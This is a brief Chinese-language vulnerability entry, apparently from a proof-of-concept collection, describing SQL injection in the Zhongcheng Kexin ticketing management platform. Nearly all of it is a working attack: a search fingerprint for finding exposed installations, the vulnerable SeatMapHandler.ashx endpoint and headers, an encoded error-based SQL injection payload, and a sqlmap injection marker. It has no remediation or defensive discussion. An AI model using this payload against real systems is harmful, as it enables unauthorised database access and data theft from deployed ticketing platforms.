# 中成科信票务管理平台存在SQL注入漏洞

- **系统**：中成科信票务管理平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="技术支持：北京中成科信科技发展有限公司"`
- **请求**：`POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1`
- **关键头**：`Cookie: ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
Method=GetZoneInfo&solutionNo=%27+AND+4172+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284172%3D4172%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--+bErE
SQLmap
Method=GetZoneInfo&solutionNo=1*
```